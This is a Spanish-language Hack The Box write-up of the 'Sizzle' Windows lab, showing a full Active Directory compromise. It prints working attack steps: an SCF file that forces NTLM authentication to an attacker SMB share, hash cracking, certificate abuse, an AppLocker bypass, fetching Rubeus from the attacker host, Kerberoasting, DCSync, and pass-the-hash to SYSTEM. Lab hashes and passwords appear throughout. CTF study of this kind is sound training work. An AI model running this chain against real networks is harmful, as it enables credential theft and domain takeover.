---
title: Sizzle Writeup
author: xdann1
date: 2022-08-29
categories: [Writeup, HTB]
tags: [Windows, CTF, Insane, Directorio Activo, SMB, Kerberoasting, DCSync, SFC, Interacción Usuario, Crackeo Contraseñas]
image:
  path: ../../assets/img/commons/sizzle/sizzle.png
  width: 800
  height: 500
  alt: Banner Sizzle
---

Máquina Insane, en la que nos aprovechamos de una interacción con el usuario para obtener su hash, luego conseguimos el hash de otro usuario a través de rubeus, por último nos aprovechamos de DCSync para sacar los hashes de todos los usuarios.

## Reconocimiento

Primero vamos a comprobar la conectividad con la máquina.

```plaintext
❯ ping -c 1 10.10.10.103
PING 10.10.10.103 (10.10.10.103) 56(84) bytes of data.
64 bytes from 10.10.10.103: icmp_seq=1 ttl=127 time=36.3 ms

--- 10.10.10.103 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 36.293/36.293/36.293/0.000 ms
```

En la salida del comando anterior se puede ver un parámetro llamado `ttl`, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima.

* GNU/Linux = TTL 64
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es Windows.

Vamos a usar la herramienta `nmap` para descubrir que puertos están abiertos y que servicios están asociados a estos.

```plaintext
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.103 -oG allPorts
```

* -p- -> Escanea todos los puertos (65535)
* --open -> Muestra solo los puertos con un estatus "open"
* -sS -> Aplica un TCP SYN Scan
* --min-rate 5000 -> Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv -> Muestra la información en pantalla a medida que se descubre
* -n -> Indica que no aplique resolución DNS
* -Pn -> Indica que no aplique el protocolo ARP
* 10.10.10.103 -> Dirección IP que se quiere escanear
* -oG allPorts -> Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 08:27 CEST
Scanning 10.10.10.103 [65535 ports]
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49711/tcp open  unknown          syn-ack ttl 127
49719/tcp open  unknown          syn-ack ttl 127
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```plaintext
❯ nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49667,49669,49677,49688,49689,49691,49694,49706,49711,49719 -sC -sV 10.10.10.161 -oN targeted
```

* -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49667,49669,49677,49688,49689,49691,49694,49706,49711,49719 -> Indica los puertos que se quieren escanear
* -sC -> Lanza scripts básicos de enumeración
* -sV -> Enumera la versión y servicio que está corriendo en los puertos
* 10.10.10.103 -> Dirección IP que se quiere escanear
* -oN targeted -> Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 08:32 CEST
Nmap scan report for HTB.LOCAL (10.10.10.103)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2022-08-29T06:34:07+00:00; +8s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2022-08-29T04:35:53
|_Not valid after:  2023-08-29T04:35:53
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2022-08-29T06:34:07+00:00; +8s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
                                         ---SKIP---
```

Los puertos abiertos y sus servicios asocidados son:

* 21/tcp -> ftp
* 53/tcp -> dns
* 80/tcp -> http
* 135/tcp -> rpc
* 139/tcp -> rpc
* 389/tcp -> ldap
* 443/tcp -> https
* 445/tcp -> smb
* 464/tcp -> kpasswd
* 593/tcp -> ncacn_http
* 636/tcp -> ssl/ldap
* 3268/tcp -> ldap
* 3269/tcp -> ssl/ldap
* 5985/tcp -> http
* 5986/tcp -> ssl/http
* 9389/tcp -> mc-nmf
* 47001/tcp -> http

## FTP

Vemos que el FTP permite el login anónimo, vamos a ver que contiene.

```plaintext
❯ ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:xdann1): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -a
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> put test.txt
local: test.txt remote: targeted
200 PORT command successful.
550 Access is denied.
```

No existe ningún archivo, además, no tenemos permisos para subir archivos. 

## Web

Vemos que está abierto un servidor web, vamos a ver las tecnologías que utiliza la página. 

```plaintext
❯ whatweb http://10.10.10.103
http://10.10.10.103 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.103], Microsoft-IIS[10.0], X-Powered-By[ASP.NET]
```

Tiene todas las tecnologías actualizadas, vamos a realizar un pequeño fuzzing con `dirsearch`.

```plaintext
❯ dirsearch -u http://10.10.10.103
Target: http://10.10.10.103/

[14:47:20] Starting: 
[14:47:20] 403 -  312B  - /%2e%2e//google.com
[14:47:25] 403 -    2KB - /Trace.axd
[14:47:26] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[14:47:31] 403 -    1KB - /aspnet_client/
[14:47:31] 301 -  157B  - /aspnet_client  ->  http://10.10.10.103/aspnet_client/
[14:47:32] 403 -    1KB - /certenroll/
[14:47:32] 401 -    1KB - /certsrv/
[14:47:36] 301 -  150B  - /images  ->  http://10.10.10.103/images/
[14:47:36] 403 -    1KB - /images/
[14:47:36] 200 -   60B  - /index.html
```

En la ruta "certsrv" encontramos un panel de login, nos lo apuntamos que luego nos puede ser útil.

## SMB

Vamos a ver que nos encontramos en el puerto 445 (SMB), haremos uso de un "Null Session" junto con herramientas para enumerar este puerto. Entre ellas, `crackmapexec`, `smbclient` y `smbmap`.

```plaintext
❯ crackmapexec smb 10.10.10.103
SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
❯ smbmap -H 10.10.10.103 -u "test"
[+] Guest session   	IP: 10.10.10.103:445	Name: HTB.LOCAL                                         
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	NO ACCESS	Logon server share 

```

Tenemos acceso de lectura a los recursos compartidos "Department Shares" y "IPC$", vamos a montarnos ambos recursos en nuestra máquina para verlos de una forma más comoda, además, tenemos un dominio, vamos a apuntarnoslo en el `/etc/hosts`.

```plaintext
❯ mount -t cifs -o username=xdann1,password=  '//10.10.10.103/Department Shares' /mnt/shares
```

Si entramos a "/mnt/shares/" veremos que existen una gran cantidad de carpetas, vamos a verlo mejor con `tree -fas`.

```plaintext
❯ tree -fas
.
├── [          0]  ./Accounting
├── [          0]  ./Audit
├── [          0]  ./Banking
│   └── [          0]  ./Banking/Offshore
│       ├── [          0]  ./Banking/Offshore/Clients
│       ├── [          0]  ./Banking/Offshore/Data
│       ├── [          0]  ./Banking/Offshore/Dev
│       ├── [          0]  ./Banking/Offshore/Plans
│       └── [          0]  ./Banking/Offshore/Sites
├── [          0]  ./CEO_protected
├── [          0]  ./Devops
├── [          0]  ./Finance
├── [          0]  ./HR
│   ├── [          0]  ./HR/Benefits
│   ├── [          0]  ./HR/Corporate Events
│   ├── [          0]  ./HR/New Hire Documents
│   ├── [          0]  ./HR/Payroll
│   └── [          0]  ./HR/Policies
├── [          0]  ./Infosec
├── [          0]  ./Infrastructure
├── [          0]  ./IT
├── [          0]  ./Legal
├── [          0]  ./M&A
├── [          0]  ./Marketing
├── [          0]  ./R&D
├── [          0]  ./Sales
├── [          0]  ./Security
├── [          0]  ./Tax
│   ├── [          0]  ./Tax/2010
│   ├── [          0]  ./Tax/2011
│   ├── [          0]  ./Tax/2012
│   ├── [          0]  ./Tax/2013
│   ├── [          0]  ./Tax/2014
│   ├── [          0]  ./Tax/2015
│   ├── [          0]  ./Tax/2016
│   ├── [          0]  ./Tax/2017
│   └── [          0]  ./Tax/2018
├── [          0]  ./Users
│   ├── [          0]  ./Users/amanda
│   ├── [          0]  ./Users/amanda_adm
│   ├── [          0]  ./Users/bill
│   ├── [          0]  ./Users/bob
│   ├── [          0]  ./Users/chris
│   ├── [          0]  ./Users/henry
│   ├── [          0]  ./Users/joe
│   ├── [          0]  ./Users/jose
│   ├── [          0]  ./Users/lkys37en
│   ├── [          0]  ./Users/morgan
│   ├── [          0]  ./Users/mrb3n
│   └── [          0]  ./Users/Public
└── [          0]  ./ZZ_ARCHIVE
                                         ---SKIP---
```

## AS-REP Roast

Vemos una carpeta que contiene lo que parecen ser usuarios, vamos a apuntarnoslos para probar un AS-REP Roasting.

```plaintext
❯ impacket-GetNPUsers HTB.LOCAL/ -no-pass -usersfile users
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] [Errno Connection error (HTB.LOCAL:88)] [Errno 113] No route to host
[-] [Errno Connection error (HTB.LOCAL:88)] [Errno 113] No route to host
[-] [Errno Connection error (HTB.LOCAL:88)] [Errno 113] No route to host
                                         ---SKIP---
```

No nos funciona el AS-REP Roast.

## SCF File Attack

Vamos a ver los permisos que tenemos sobre las carpetas para ver si tenemos algún privilegio de escritura en alguna carpeta.

```bash
❯ for dir in $(ls /mnt/shares); do for subdir in $(ls /mnt/shares/$dir); do smbcacls "//10.10.10.103/Department Shares" "$dir/$subdir" -N | grep -i everyone | grep -i full > /dev/null && echo "[*] Directorio $dir/$subdir: Permisos de escritura"; done; done
```

Veremos que tenemos acceso completo en el directorio "Users/Public" y en el directorio "ZZ_ARCHIVE"

```plaintext
[*] Directorio Users/Public: Permisos de escritura
[*] Directorio ZZ_ARCHIVE/AddComplete.pptx: Permisos de escritura
[*] Directorio ZZ_ARCHIVE/AddMerge.ram: Permisos de escritura
[*] Directorio ZZ_ARCHIVE/ConfirmUnprotect.doc: Permisos de escritura
[*] Directorio ZZ_ARCHIVE/ConvertFromInvoke.mov: Permisos de escritura
[*] Directorio ZZ_ARCHIVE/ConvertJoin.docx: Permisos de escritura
[*] Directorio ZZ_ARCHIVE/CopyPublish.ogg: Permisos de escritura
                                         ---SKIP---
```

Vamos a subir archivos en estas dos rutas para ver si existe algún modo de interacción con un usuario.

```plaintext
> put test.txt (en Users/Public)
❯ watch -n 5 ls /mnt/shares/Users/Public

> put test.txt (en ZZ_ARCHIVE)
❯ watch -n 5 ls /mnt/shares/ZZ_ARCHIVE
```

Al tiempo vemos que el archivo que subimos en "Users/Public" es eliminado, por lo que podemos suponer que existe una interacción con un usuario. Podríamos intentar subir un archivo que intente cargar un fichero en un servidor que nos hemos creado anteriormente, de tal forma que consigamos el hash NTLMv2 del usuario. En la siguiente [página](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) podeis encontrar más información acerca de este ataque.

Vamos a crear el archivo que va a hacer que el usuario interactue con nuestro servidor de tal forma que consigamos el hash NTLMv2.

```plaintext
[Shell]
Command=2
IconFile=\\10.10.14.21\smbFolder\users
[Taskbar]
Command=ToggleDesktop
```

Ya con el archivo creado, lo vamos a subir a "Users/Public", al momento nos crearemos un servidor utilizando `smbserver`, esperaremos unos minutos hasta conseguir el hash NTLMv2 del usuario. 

```plaintext
❯ impacket-smbserver smbFolder $(pwd) -smb2support
```

Este sería el hash del usuario "amanda".

```plaintext
amanda::HTB:aaaaaaaaaaaaaaaa:c424ebae358ef3c9f993d2bb665019d4:0101000000000000806203b39ebbd8013dd2da32f0e578f200000000010010006d004c00570049007800550042005300030010006d004c005700490078005500420053000200100064007100520072006400660059005200040010006400710052007200640066005900520007000800806203b39ebbd801060004000200000008003000300000000000000001000000002000007c220dc2b1dbb0d8649575e244e9a3d56815d306332defe978a80873758ae1f70a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000
```

Vamos a intentar crackear el hash del usuario "amanda" con john.

```plaintext
❯ john --w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)
1g 0:00:00:07 DONE (2022-08-29 14:22) 0.1362g/s 1555Kp/s 1555Kc/s 1555KC/s Ashiah08..Ariel!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Ya tenemos la contraseña del usuario "amanda", las credenciales quedarían así "amanda:Ashare1972". Vamos a probar si las credenciales son válidas en `smb` y `evil-winrm`.

```plaintext
❯ crackmapexec smb 10.10.10.103 -u amanda -p 'Ashare1972'
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
❯ crackmapexec winrm 10.10.10.103 -u amanda -p 'Ashare1972'
SMB         10.10.10.103    5986   SIZZLE           [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
HTTP        10.10.10.103    5986   SIZZLE           [*] https://10.10.10.103:5986/wsman
WINRM       10.10.10.103    5986   SIZZLE           [-] HTB.LOCAL\amanda:Ashare1972 "The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''"
```

## RPC

Ahora que tenemos unas credenciales podemos probar a sacar datos del rpc, voy a utilizar el siguiente [repositorio](https://github.com/creep33/rpcenumV2) para ello.

```plaintext
❯ ./logRPCenum -e All -i 10.10.10.103 -u 'amanda' -p 'Ashare1972' > all
```

No tenemos nada interesante aparte de más usuarios. 

## Certificados

Las credenciales son válidas para `smb`, vamos a ver si tenemos acceso a algún recurso compartido que no teníamos acceso antes.

```plaintext
❯ smbmap -H 10.10.10.103 -u "amanda" -p "Ashare1972"
[+] IP: 10.10.10.103:445	Name: HTB.LOCAL                                         
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	READ ONLY	Logon server share 
```

Vemos que tenemos acceso al recurso compartido "CertEnroll", tiene un nombre parecido a la ruta del login que encontramos anteriormente, por lo que suponemos que si tenemos acceso al recurso compartido tendremos acceso al login, vamos a intentar autenticarnos con estas credendeciales contra el panel de login.

![Login Amanda]({{ 'assets/img/commons/sizzle/login.png' | relative_url }}){: .center-image }
_Login Amanda_

Las credenciales son válidas y nos conseguimos autenticar, la página es de "Microsoft Active Directory Certificate Services", en ella podemos generar certificados que podremos usar posteriormente para demostar que realmente somos la persona que decimos ser.

Nosotros para autenticarnos en `evil-winrm` utilizando certificados necesitamos 2 archivos, un archivo "\*.key" y un archivo "\*.cer", el archivo "\*.key" lo podemos generar localmente, sin embargo, para generar el archivo "\*.cer" necesitaremos introducir en la página un archivo "\*.csr", este último archivo lo podemos generar desde el archivo "\*.key". Vamos a generar todos los certificados para poder conectarnos por `evil-winrm`.

```plaintext
❯ openssl req -newkey rsa:2048 -nodes -keyout filename.key -out filename.csr
```

Ya con el archivo "\*.csr" podemos generar el archivo "\*.cer" en la página web. Tendremos que acceder "Request a certificate > advanced certificate request", tendremos que copiar el contenido del archivo "filename.csr" en la web.

![Creamos el certificado]({{ 'assets/img/commons/sizzle/certificate.png' | relative_url }}){: .center-image }
_Creamos el certificado_

Una vez que le hayamos pasado el archivo "\*.cer" nos darán algunas opciones para descargar el certificado, vamos a elegir "Base 64 encoded" y luego le daremos a "Download Certificate".

![Descargamos el certificado]({{ 'assets/img/commons/sizzle/descarga.png' | relative_url }}){: .center-image }
_Descargamos el certificado_

Una vez que tengamos descargado el certificado simplemente le tendremos que pasar ambos certificados a `evil-winrm` y nos podremos conectar.

```plaintext
❯ evil-winrm -S -c certnew.cer -k filename.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

## Shell como amanda

Vamos a realizar un reconocimiento básico sobre la máquina víctima 

```plaintext
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

> net user amanda
User name                    amanda
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/10/2018 4:42:11 PM
Password expires             Never
Password changeable          7/11/2018 4:42:11 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/29/2022 10:32:11 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users
Global Group memberships     *Domain Users
The command completed successfully.
```

No tenemos ningún usuario o privilegio asignado fuera de lo normal. Vamos a ver si la máquina tiene abierto algún puerto que no se pueda ver desde el exterior.

```plaintext
> netstat -ap tcp > netstat.txt
> download netstat.txt
❯ cat netstat.txt | awk '{print $2}' | grep "0.0.0.0" | tr ":" " " | awk '{print $2}' > internal_ports
```

Entre todos los puertos que tiene abiertos internamente la máquina víctima vemos algunos que no lo están para los demás, entre ellos el puerto 88 (Kerberos). 

## Bloodhound

Vamos a abrirnos `bloodhound` para enumerar usuarios kerberoasteables y otra información. Antes de nada, tendremos que conseguir el comprimido con el cual vamos a operar desde `bloodhound`. Esto lo haremos con el propio ingestor que trae `bloodhound`, en este caso vamos a utilizar la version en python.

```plaintext
❯ bloodhound-python -u 'amanda' -p 'Ashare1972' -ns 10.10.10.103 -d HTB.LOCAL -c All --zip
```

Ya con el zip en nuestra máquina, nos abriremos `bloodhound` y `neo4j` para poder ver la información que acabamos de conseguir (si nunca habeis utilizado neo4j antes os pedirán que cambieis la contraseña, las credenciales por defecto para acceder son “neo4j:neo4j”).

```plaintext
❯ neo4j console
❯ bloodhound &>/dev/null disown
```

Cuando ya tengamos totalmente abierto `bloodhound` tendremos que subir los datos, esto lo haremos desde el siguiente botón.

![Subimos los datos]({{ 'assets/img/commons/sizzle/upload_data.png' | relative_url }}){: .center-image }
_Subimos los datos_

Cuando ya tengamos todos los datos subidos en `bloodhound` filtraremos por "List all Kerberoastable Accounts" para ver que usuarios podemos conseguir su ticket TGS (Ticket Granting Service).

![Buscamos usuarios kerberoasteables]({{ 'assets/img/commons/sizzle/kerberoastable_users.png' | relative_url }}){: .center-image }
_Buscamos usuarios kerberoasteables_

Ya tenemos un usuario vulnerable a un kerberoasting attack, sin embargo, como hemos visto antes no tenemos acceso directo al puerto de kerberos (88), por lo que tendremos que traernoslo a nuestra máquina utilizando un port forwarding o podemos utilizar `rubeus` para hacerlo desde la propia máquina, yo utilizaré `rubeus`. Igualmente, sigamos viendo en `bloodhound` que podemos hacer con el usuario "mrlky", filtraremos por "Find Principals with DCSync Rights"

![Buscamos usuarios con privilegios de DCSync]({{ 'assets/img/commons/sizzle/users_dcsync.png' | relative_url }}){: .center-image }
_Buscamos usuarios con privilegios de DCSync_

Vemos que el usuario "mrlky" puede realizar un DCSync attack.

## Rubeus

El esquema de ataque sería el siguiente:

1. Descargamos rubeus en la máquina víctima.
2. Conseguimos el ticket TGS del usuario "mrlky" con un kerberoasting attack
3. Crackeamos el hash
4. Abusamos del privilegio DCSync

Vamos a descargar `rubeus` en la máquina victima para poder utilizarlo, lo podéis descargar desde la siguiente [url](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe). Nos vamos a compartir un servidor web desde el que nos descargaremos `rubeus` en la máquina víctima.

```plaintext
❯ python3 -m http.server 80
> iwr -uri http://10.10.14.21/Rubeus.exe -outfile Rubeus.exe
> ./Rubeus.exe
```

Si intentamos ejecutar `Rubeus.exe` veremos que nos da un error debido a que el programa está bloqueado debido a "políticas de grupos", vamos a ver si tenemos algún directorio en el que nos podamos saltar esta restricción.

```plaintext
> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {\%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
                                         ---SKIP---
```

Todos los ficheros que han sido creados debajo de la carpeta "Windows" deberían ser permitidos para ejecutarse, vamos a crearnos una carpeta en la que nos descargaremos `rubeus`.

```plaintext
> mkdir C:\Windows\temp\rubeus
> cd C:\Windows\temp\rubeus
> iwr -uri http://10.10.14.21/Rubeus.exe -outfile Rubeus.exe
> ./Rubeus.exe
```

Comprobamos que ya podemos ejecutar `rubeus`, ahora vamos a sacar el ticket TGS del usuario "mrlky".

```plaintext
> ./Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 
```

El hash del usuario "mrlky" sería el siguiente:

```plaintext
$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$7e9b64b7d5699f77c24bb5e091f958b9$b2f621ccaf317fe23bb8d38bcf46e7e6db72ee80bfc46d74f49d8f289bd00fd0cb00530f07ab266b032b15451b56db089864f7ae9c75e68d5a797e409f394bafffab1e28baa735af5bef6d9974d2239f1b856ebae73f1393aa9ca20af62f21e3ba8c83b3c749e6a9f2ed06adbe5555ae508db7cf85416862ceaa000fe3af85024eb14c340d52c00ed83aa9eaed3956666215987e020adcde5576fe0af35bd80ee552503400a8feb92ca030ed75c4934fc4508c10090a1f074ad738b26c054d9efd9bec6c9912f8a5d02896dd5ab34584eab6653b11ad826bf08c24f218d236e603ec25a8d40c7f0fd35fecce1e57a0ad899208ccec1df848e0139f2549ac4a2f5d3ba3baf1d51b3b2644f70f65a8db016d41f8cc459d961d640eedd93e2ce08ba17f65a892c4e374e8d4bb45f890a210156dc17d569c6b44b9680b5e3d42259a7b12a7e1cb5d7120e87771924b16d1c33f8eaca5d4337db36d80a7a0843702fa8415ae94fb389e4419012054fdaf237fb2477c8974f1be2a73cbc81ffd994904114b1ee4ca31a555eab060df88f5255d88ec3677133dc255c6d7703eac3fac958fbd74ab429b7f33f0f7d206e4fdcbb26bce4143dfd69101dc46e141c96697ee38902368b6a3eb216792962ae2228b186f718b7e69306f275320ed1030d830950f042f6e02fb6593b369806c324c521cbc2f4092e59339dc88abcd5f348d56ede5585bb05d62097a218f38a32122afca6cd8d507b8c753ec80dc492bf0975d2071cbd57f1e81b23c26c0a05876c37da6127273c6e6b746f3d90d79c4c9f37ff4e9d628d570b01d71df5f7b313b1c0430102b8b4f815eee195f3b27cc1900a7f8c457612da76c9ad95d3a5cfa3220c2c26da25c7a0a8edc95ad85baa386b808326ad2347c3c30e79abe85964fabc4423ff0fe786885022de638027b030784bde2f4816922ab0ad795ba5c5fcae70a01b0e731ee48a39041989c409aca5e84648d1c322f36e213db9988a9550cc5477f77adb681cb310306f00324bbad57b98844d2a426f32f946fd2f2fdba4117a1ae4299fcb60aa4c6e71eea3168e7f1ff30dbff3e62de87cf27bdd66e64e0c9579a6dbc2eabdcf9b83fe7cbf5982762b1d53226d6e6a1107d32d46f5b0128d3ecfd9da61f8235e942734762d5771c92b85480dcd66d3924110131793ebb4885ff197760ca596d9264b4ed1f2d6c7865149d00511737b6eac12a0d7c531535ab5a65087eb510507c5f29d1
```

Vamos a crackearlo utilizando `john`.

```plaintext
❯ john --w=/usr/share/wordlists/rockyou.txt hash
```

Estas serían las credenciales del usuario "mrlky:Football#7". 

## DCSync Attack

Ahora que tenemos las crendeciales del usuario "mrlky", vamos a realizar un DCSync attack, yo voy a utilizar `secrectsdump` para realizar este ataque.

```plaintext
❯ impacket-secretsdump htb.local/mrlky@10.10.10.103
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
                                         ---SKIP---
```

Vamos a probar las credenciales en `crackmapexec`.

```plaintext
❯ crackmapexec smb 10.10.10.103 -u Administrator -H 'f6b7160bfc91823792e0ac3a162c9267'
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\Administrator:f6b7160bfc91823792e0ac3a162c9267 (Pwn3d!)
```

## Shell como Administrador

Nos conectamos por `smb` utilizando `psexec`.

```plaintext
❯ impacket-psexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.103.....
[*] Found writable share ADMIN$
[*] Uploading file cNnRZHCw.exe
[*] Opening SVCManager on 10.10.10.103.....
[*] Creating service WHtp on 10.10.10.103.....
[*] Starting service WHtp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\mrlky\Desktop\user.txt
f0ccc98fcd28d1cf****************
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
7b5fbfac66ab8dc7****************
```
